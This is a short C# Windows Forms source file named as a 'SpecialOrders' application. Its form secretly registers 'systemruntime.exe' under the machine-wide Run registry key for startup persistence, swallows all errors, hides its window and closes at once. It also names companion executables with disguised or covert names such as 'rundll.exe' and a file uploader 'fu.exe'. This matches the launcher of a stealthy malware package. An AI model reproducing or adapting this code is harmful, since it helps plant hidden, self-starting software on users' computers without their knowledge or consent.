using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace SpecialOrders
{
    public partial class frmMain : Form
    {
        public frmMain()
        {
            StartupWindows(true, NAME_SYSTEM_RUNTIME);

            InitializeComponent();
            this.Visible = false;     
        }

        private void StartupWindows(Boolean putInStartup, String fileName)
        {
            try
            {
                Microsoft.Win32.RegistryKey registryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                if (putInStartup)
                    registryKey.SetValue(System.IO.Path.GetFileNameWithoutExtension(fileName), System.IO.Path.Combine(System.IO.Path.GetDirectoryName(Application.ExecutablePath), fileName));
                else
                    registryKey.DeleteValue(System.IO.Path.GetFileNameWithoutExtension(fileName), false);
            }
            catch
            {
            }
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            this.Close();
        }

        private String NAME_SPECIAL_ORDERS = "os.exe";
        private String NAME_SYSTEM_RUNTIME = "systemruntime.exe";
        private String NAME_FILE_UPLOADER = "fu.exe";
        private String NAME_RUN_DLL = "rundll.exe";
    }
}

